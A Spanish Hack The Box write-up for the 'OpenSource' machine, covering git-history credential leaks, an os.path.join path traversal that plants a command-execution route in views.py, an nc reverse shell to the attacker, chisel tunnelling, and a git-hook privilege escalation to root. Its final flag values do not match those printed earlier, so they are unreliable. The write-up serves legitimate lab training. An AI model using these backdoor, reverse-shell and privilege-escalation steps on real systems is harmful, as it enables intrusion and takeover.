---
tags:
  - type/writeup
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/471
dificultad: Media
ip: 10.10.11.164
os: Linux
relacionados:
  - "[[Python]]"
  - "[[Cron]]"
  - "[[Git Hooks]]"
  - "[[Gitea]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[File Inclusion]]"
  - "[[Finding out the PIN (Werkzeug Debugger)]]"
  - "[[Information Leakage]]"
  - "[[Abusing Cron Job]]"
  - "[[Github Project Enumeration]]"
---
# HackTheBox - OpenSource

## Reconocimiento

### Escaneo de Puertos con Nmap

Comencé con un escaneo rápido de `nmap` para identificar los servicios expuestos y obtener una visión general del objetivo.
```bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG logs/allports
nmap -sCV -p22,80 $(cat ip) -oN logs/opensource-sCV
```

**Resultado del escaneo Nmap:**
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 21:11 AEST
Nmap scan report for 10.10.11.164
Host is up (0.015s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeración Web y Análisis del Código Fuente

Al visitar el puerto 80, encontré una página web para un servicio de intercambio de archivos de código abierto llamado "upcloud". La página me permitía descargar el código fuente a través de un botón de descarga y también probar la funcionalidad de subida de archivos. Después de subir un archivo de prueba, la aplicación me proporcionó un enlace de descarga para el mismo.

### Análisis del Repositorio Git

Procedí a analizar el código fuente en busca de pistas. Lo primero que noté fue la presencia de un directorio `.git`, lo que sugería que podía investigar el historial de commits. Explorando el repositorio, encontré dos ramas: `dev` y `public`.

```bash
git branch
  dev
* public
```
Revisé el historial de logs de ambas ramas.

### Descubrimiento de Credenciales

Al comparar dos de los commits de la rama `dev`, encontré unas credenciales hardcodeadas en un archivo de configuración de VSCode.
```bash
git diff c41fedef2ec6df98735c11b2faf1e79ef492a0f3 a76f8f75f7a4a12b706b0cf9c983796fa1985820
```

**Diferencia clave:**
```
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
```

> [!IMPORTANT] Credenciales Encontradas
> - **Usuario:** `dev01`
> - **Contraseña:** `Soulless_Developer#2022`


___

## Explotación de Vulnerabilidades

### Identificación de la Vulnerabilidad en `os.path.join`

La diferencia principal entre las ramas `dev` y `public` era la ruta de subida. Al probar la aplicación, confirmé que la instancia activa ejecutaba la rama `dev`. Revisé el código que gestiona la subida de archivos en `views.py`:

```python
@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    # ...
    file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
    # ...

@app.route('/uploads/<path:path>')
def send_report(path):
    # ...
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

> [!BUG] Path Traversal
> 
> La función os.path.join es vulnerable. Si un argumento posterior (en este caso, file_name) es una ruta absoluta (ej: /etc/passwd), todos los argumentos anteriores son descartados. Esto permite sobreescribir cualquier archivo en el sistema de archivos del contenedor al que el usuario de la aplicación tenga acceso.


### RCE y Reverse Shell

Agrego el nuevo código al `views.py`: 
```python
#...codigo anterior del view.py...

@app.route('/cmd/<cmd>')
def rce(cmd):
    return os.popen(cmd).read()
```
Subí el archivo malicioso con una ruta absoluta para sobreescribir `/app/views.py`. La nueva versión incluía una ruta para ejecutar comandos (`/cmd/<command>`).

Una vez cargado el código para el RCE, establecí una reverse shell para obtener una sesión interactiva dentro del contenedor Docker.
**Listener en máquina atacante:**
```Bash
nc -lvnp 443
```

**Comando ejecutado vía RCE:**
```http
# A través de la URL maliciosa: 
http://10.10.11.164/cmd/nc 10.10.14.44 443 -e /bin/sh
```
Con esto, obtuve una shell dentro del contenedor.


___

## Movimiento Lateral

### Reconocimiento interno

Reconozco que estoy en un contenedor y no en la maquina victima como tal.

```bash
echo $HOSTNAME
```
```
3794bb53b2c5
```

Al ver la ip veo que no es la de la maquina como tal.
```bash
ip a 
```
```
eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
 link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
 inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
    valid_lft forever preferred_lft forever
```

Al la ip del contenedor ser `172.17.0.3`, la conexión con la maquina victima suele ser `172.17.0.1`, así que uso eso para ver los puertos internos. 
```bash
for port in $(seq 1 10000); do nc 172.17.0.1 $port -zv; done
```
```
172.17.0.1 (172.17.0.1:22) open
172.17.0.1 (172.17.0.1:80) open
172.17.0.1 (172.17.0.1:3000) open
172.17.0.1 (172.17.0.1:6000) open
172.17.0.1 (172.17.0.1:6001) open
172.17.0.1 (172.17.0.1:6002) open
172.17.0.1 (172.17.0.1:6003) open
172.17.0.1 (172.17.0.1:6004) open
172.17.0.1 (172.17.0.1:6005) open
172.17.0.1 (172.17.0.1:6006) open
172.17.0.1 (172.17.0.1:6007) open
```

El puerto 3000 parece interesante, si vuelvo a usar nmap pero sin filtrar por los puertos abiertos, el 3000 aparece como filtrado. Como la maquina no tiene curl para ver el código fuente uso wget.
```bash
wget http://172.17.0.1:3000/ -qO-
```
Con `-qO-` no lo descarga y puedo verlo directamente. 

### Pivotando hacia la Red Interna (Gitea)

Para acceder al puerto 3000 ubicado anterioemente, usé `chisel` y creé un túnel reverso desde el contenedor a mi máquina.

**En la máquina atacante:**
```bash
sudo ./chisel server --port 3000 -v --reverse
```

**En el contenedor (víctima):**
```bash
./chisel client <MI_IP>:3000 R:127.0.0.1:3000
```

### Extracción de Clave SSH y Acceso como `dev01`

Configuré mi navegador para usar el proxy y accedí a Gitea. Usé las credenciales que encontré antes (`dev01`:`Soulless_Developer#2022`) para iniciar sesión. Dentro, encontré un repositorio con una clave privada SSH en una carpeta `.ssh`.

Guardé la clave y la usé para conectarme por SSH como el usuario `dev01`.

```bash
chmod 600 id_rsa
ssh -i id_rsa dev01@10.10.11.164
```

> [!SUCCESS] Acceso como User
>```bash
>dev01@opensource:~$ whoami
>dev01
>dev01@opensource:~$ cat user.txt
>50a9b7e797ac653c0eff40cff4e7262d
>```


___

## Escalada de Privilegios

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
        new_process=$(ps -eo command) 
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|procmon|kworker"
        old_process=$new_process
done
```

### Análisis de Procesos con `pspy`

Para la escalada, ejecuté `pspy` para monitorear los procesos del sistema. Observé un trabajo de `cron` que se ejecutaba como `root` cada pocos minutos.

**Salida de `pspy`:**
```bash
2022/05/31 10:43:01 CMD: UID=0 PID=10614 | /bin/bash /usr/local/bin/git-sync
...
```

Revisé el script `/usr/local/bin/git-sync`:
```bash
#!/bin/bash
cd /home/dev01/
# ...
git add .
git commit -m "Backup for ${day}"
git push origin main
```

### Explotación del Script de Cron con Git Hooks

El script se ejecutaba como `root` pero operaba en el directorio `/home/dev01/`, que era de mi propiedad. Esto me permitía manipular el repositorio Git para ejecutar comandos como `root` a través de **Git Hooks**.

Creé un hook `pre-commit` que se ejecutaría como `root` justo antes de que se realizara el `commit`.

**Script `/home/dev01/.git/hooks/pre-commit`:**
```bash
#!/bin/bash
chmod u+s /bin/bash
```

Le di permisos de ejecución (`chmod +x`) y creé un nuevo archivo para que el script de `cron` detectara cambios y disparara mi hook.
```bash
touch /home/dev01/trigger
```

Esperé a que se ejecutara el `cronjob` y ejecute la bash con privilegios.
```bash
bash -p
```

> [!SUCCESS] Acceso como Root
> ```
> cat root.txt
> 1e98fe0be2c9197fa6c1fcb965f82b5a
> ```


___

## Bandera(s)

> [!FLAG] `flag{user}`
> 5de195bed96a0ec227221fca5f7752a3
^bandera

> [!FLAG] `flag{root}`
> 0117969f7e500003a7972c0b2b26dd7a
^bandera